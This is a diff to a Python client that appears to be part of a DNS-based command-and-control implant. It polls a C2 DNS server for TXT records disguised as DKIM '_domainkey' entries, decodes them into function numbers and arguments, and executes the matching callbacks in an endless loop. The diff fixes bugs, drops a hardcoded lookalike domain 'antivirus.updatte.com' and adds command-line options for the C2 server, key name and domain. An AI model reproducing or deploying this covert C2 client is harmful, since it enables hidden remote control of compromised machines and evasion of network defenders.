@@ -1,6 +1,7 @@
 #!/usr/bin/python
 # -*- coding: utf8 -*-
 
+import argparse
 import sys
 import base64
 import time
@@ -53,7 +54,7 @@ class DNSResolver:
         try:
             print('[*] Querying DNS {} records from {}'.format(r_type, domain))
             return self.resolver.query(domain, r_type)
-        except dns.resolver.NXDOMAIN:
+        except (dns.resolver.NXDOMAIN, dns.exception.Timeout):
             return None
 
     def query_DKIM_record(self, key_name: str, domain: str):
@@ -61,10 +62,12 @@ class DNSResolver:
         """
 
         # Get TXT records by querying default._domainkey subdomain of the C2 domain.
-        txt_records = self._query_dns_by_type('{}}._domainkey.{}'.format(key_name, domain), 'TXT', 2000)
+        txt_records = self._query_dns_by_type('{}._domainkey.{}'.format(key_name, domain), 'TXT', 5)
 
         # Get every record decoded with UTF-8
-        return [j for x in txt_records for j in list(map(lambda k: k.decode('utf-8'), x.strings))]
+        if txt_records:
+            return [j for x in txt_records for j in list(map(lambda k: k.decode('utf-8'), x.strings))]
+        return []
 
 
 class Client:
@@ -73,6 +76,7 @@ class Client:
 
         :param c2s_ip: C2 server IP address
         :param target_domain: Domain to ask for
+        :param key_name: Client key name
 
     Attributes:
         resolver: DNS resolver
@@ -83,9 +87,10 @@ class Client:
     ASCII_VALUE_CHAR = {x: chr(x) for x in range(0, 128)}
     PK_REGEX = re.compile('p=(.*);')
 
-    def __init__(self, c2s_ip: str, target_domain: str):
+    def __init__(self, c2s_ip: str, target_domain: str, key_name: str):
         self.c2s_ip = c2s_ip
         self.target_domain = target_domain
+        self.key_name = key_name
         self.resolver = DNSResolver(c2s_ip)
         self.function_reference = {
             1: {
@@ -187,14 +192,20 @@ class Client:
     def _ask_and_execute(self):
         """ Single asking loop iteration
         """
-        dkim_records = self.resolver.query_DKIM_record(self.key_name, 'antivirus.updatte.com')
-        for i in dkim_records:
-            # Get the PK
-            to_decode = Client.PK_REGEX.search(i).group(1)
-            # Parse it
-            function_number, params = self.decode(to_decode)
-            # Execute the function by number and pass arguments
-            self.function_reference[function_number]['callback'](*params)
+        dkim_records = self.resolver.query_DKIM_record(self.key_name, self.target_domain)
+
+        if dkim_records:
+            for i in dkim_records:
+                # Get the PK
+                to_decode = Client.PK_REGEX.search(i).group(1)
+                # Parse it
+                function_number, params = self.decode(to_decode)
+                # Execute the function by number and pass arguments
+                self.function_reference[function_number]['callback'](*params)
+        else:
+            print('[!] No DKIM records for me ;(')
+
+        time.sleep(2)
 
     def ask_forever(self):
         """ Infinite loop that asks the C2 server which commands to execute by sending DNS requests
@@ -208,4 +219,25 @@ class Client:
 
 
 if __name__ == '__main__':
-    c = Client('127.0.0.1', 'example.com')
+
+    parser = argparse.ArgumentParser()
+
+    parser.add_argument('server_ip',
+                        help="C2 DNS server IP Address (might be the same as the C2 server or not.",
+                        type=str)
+    parser.add_argument('-k', '--keyname',
+                        help='Client key name that identifies it on the server side. Default is "alice"',
+                        type=str,
+                        default="alice",
+                        dest='keyname',
+                        required=False)
+    parser.add_argument('-d', '--domain',
+                        help='Domain to resolve. Default "test.com"',
+                        default="test.com",
+                        type=str,
+                        dest='domain',
+                        required=False)
+
+    arguments = vars(parser.parse_args())
+
+    Client(arguments['server_ip'], arguments['domain'], arguments['keyname']).ask_forever()
